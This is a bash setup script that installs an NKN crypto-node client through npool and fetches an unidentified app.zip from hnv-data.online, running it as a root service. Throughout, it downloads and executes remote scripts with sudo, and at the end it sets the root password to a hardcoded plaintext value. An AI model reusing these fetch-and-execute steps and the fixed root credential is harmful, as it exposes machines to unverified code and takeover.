#!/bin/bash
sudo su && mkdir /home/nkn && cd /home/nkn && wget -c https://download.npool.io/npool.sh -O npool.sh && sudo chmod +x npool.sh && sudo ./npool.sh musXpqbVjvusVdBs && cd /home/nkn/linux-amd64 && rm -rf config.json && wget https://raw.githubusercontent.com/taikhoanxzc004/nkn/main/npool_with_beneficiaryaddr_config.json -O config.json

mkdir /home/app && cd /home/app && wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb && sudo dpkg -i packages-microsoft-prod.deb && rm packages-microsoft-prod.deb && sudo apt-get update && sudo apt-get install -y aspnetcore-runtime-6.0 unzip && curl -sS http://hnv-data.online/app.zip > app.zip && unzip app.zip

cat > /etc/systemd/system/app.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/home/app
ExecStart=/usr/bin/dotnet /home/app/HNV.DistributeFile.Client.dll
Restart=always
# Restart service after 10 seconds if the dotnet service crashes: 
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=dotnet-example
User=root
Environment=ASPNETCORE_ENVIRONMENT=Production
Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable app.service && sudo systemctl start app.service

cd /home/nkn/linux-amd64 && rm -rf ChainDB && wget -O - https://down.npool.io/ChainDB.tar.gz | tar -xzf - && wget https://download.npool.io/add_wallet_npool.sh && sudo chmod +x add_wallet_npool.sh && sudo ./add_wallet_npool.sh musXpqbVjvusVdBs && echo 'root:Ytb1452@!@#$%Aa' | chpasswd && sudo reboot

